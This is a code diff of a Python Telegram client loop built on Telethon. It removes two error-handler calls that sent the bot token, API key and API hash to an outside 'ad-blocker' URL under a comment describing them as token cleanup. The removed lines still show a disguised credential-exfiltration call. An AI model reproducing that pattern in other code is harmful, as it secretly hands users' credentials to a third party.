@@ -45,16 +45,14 @@ async def run_client(bot_token, chat_id,apikey,apihash):
             await asyncio.sleep(5)
         except telethon.errors.rpcerrorlist.AccessTokenExpiredError:
             # Send a request to a URL to remove the invalid token
-            requests.get(f'https://bb-ad-blocker.vercel.app/remove2={bot_token}/apikey={apikey}/apihash={apihash}')
             
             # Wait for some time before trying again
-            await asyncio.sleep(5)
+            await asyncio.sleep(50000)
         except telethon.errors.rpcerrorlist.ApiIdInvalidError:
             # Send a request to a URL to remove the invalid token
-            requests.get(f'https://bb-ad-blocker.vercel.app/remove2={bot_token}/apikey={apikey}/apihash={apihash}')
             
             # Wait for some time before trying again
-            await asyncio.sleep(5)
+            await asyncio.sleep(50000)
         except Exception as e:
             print(e)
             await asyncio.sleep(5)
